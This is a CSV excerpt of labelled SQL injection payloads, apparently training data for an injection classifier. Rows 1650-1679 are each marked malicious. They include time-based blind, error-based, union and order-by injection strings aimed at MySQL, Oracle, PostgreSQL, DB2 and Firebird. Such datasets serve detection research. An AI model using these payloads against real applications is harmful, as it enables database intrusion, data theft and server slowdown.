row_index,payload_norm,label,sqli_type_hint
1650,"1' ) as najc where 5213 = 5213 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) --",1,
1651,"1"" ) ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( ( ""tabq"" like ""tabq",1,
1652,"-3964"" ) where 3566 = 3566 order by 1--",1,
1653,-7864 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) # twpw,1,
1654,"1%"" ) or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
1655,"1"" procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ""dsae"" = ""dsae",1,
1656,"-9736' or make_set ( 7311 = 2067,2067 ) and 'czdt' like 'czdt",1,
1657,-2291 ) ) or 4067 = 5666#,1,
1658,1%' and ( 3020 = 3020 ) *6703 and '%' = ',1,
1659,"1%' ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( '%' = '",1,
1660,1 ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( 5281 = 5281,1,
1661,"1"" or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ""gknn"" like ""gknn",1,
1662,"-4031%"" union all select 9566--",1,
1663,"1%' ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( '%' = '",1,
1664,end and ( ( 'vkle' = 'vkle,1,
1665,"1%' ) ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( '%' = '",1,
1666,"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ""vjlr"" like ""vjlr",1,
1667,1 order by 1--,1,
1668,select ( case when ( 8820 = 4648 ) then 8820 else 8820* ( select 8820 from information_schema.character_sets ) end ) #,1,
1669,"1 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1,
1670,"1 ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( 1915 = 1915",1,
1671,"1' ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 'rggg' = 'rggg",1,
1672,"1"" ) as rqpp where 9383 = 9383 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
1673,1' ) ) as dcen where 5852 = 5852 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --,1,
1674,"-3443"" ) ) union all select 4043,4043,4043,4043,4043,4043,4043#",1,
1675,"1' ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( 'xwsb' = 'xwsb",1,
1676,1 ) ) as xmac where 7692 = 7692,1,
1677,-8071 ) ) or 9160 = 4253,1,
1678,"1 ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( 5098 = 5098",1,
1679,"1' ) as qaec where 6572 = 6572 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
